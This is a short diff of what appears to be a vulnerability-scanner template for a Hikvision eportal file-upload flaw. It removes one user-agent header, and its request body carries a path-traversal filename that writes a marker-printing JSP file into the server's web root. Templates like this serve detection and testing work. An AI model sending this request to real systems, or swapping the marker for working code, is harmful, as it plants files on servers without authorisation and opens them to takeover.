@@ -5,7 +5,6 @@
       "method": "POST",
       "uri": "/svm/api/external/report",
       "headers":{
-        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
         "content-type": "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
       },
       "data": "------WebKitFormBoundary9PggsiM755PLa54a\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/vuleyetest.jsp\"\nContent-Type: application/zip\n\n<%out.print(\"vuleyetest\");%>\n\n------WebKitFormBoundary9PggsiM755PLa54a--",
